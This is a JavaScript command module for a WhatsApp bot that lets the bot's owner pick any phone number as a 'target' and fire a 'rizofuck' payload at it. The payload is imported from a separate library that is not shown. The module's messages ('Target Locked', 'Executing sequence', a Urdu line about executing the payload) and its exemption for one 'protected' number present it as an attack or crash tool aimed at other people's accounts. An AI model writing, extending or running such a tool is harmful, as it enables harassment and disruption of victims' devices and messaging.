let { rizofuck } = require('../lib/rizofuck');

let handler = async (m, { conn, args, command, isCreator }) => {
    if (!isCreator) return m.reply('🔒 *Owner Only - Rizofuck Command!*');

    if (!args[0]) {
        return m.reply(`📌 *Usage:* .${command} 923xx`);
    }

    let pepec = (args[0] || "").replace(/[^0-9]/g, "");

    if (!pepec) {
        return m.reply('❌ *Invalid number format!*');
    }

    let protectedNumbers = ["923154734548"];
    if (protectedNumbers.includes(pepec)) {
        return m.reply('🔒 *This number is protected!*');
    }

    let target = pepec + '@s.whatsapp.net';

    await m.reply(`💀 *Rizofuck Target Locked:* ${pepec}\n⚡ *Executing sequence...*`);

    try {
        await rizofuck(conn, target);
        await conn.sendMessage(m.chat, { react: { text: "💀", key: m.key } });
    } catch (error) {
        console.error(error);
        m.reply("⚠️ Error: Payload execute karte waqt masla aaya hai.");
    }
}

handler.command = ['rizofuck', 'rzfuck', 'fuck'];
handler.tags = ['owner', 'rizo'];
handler.help = ['rizofuck 923xx'];
module.exports = handler;
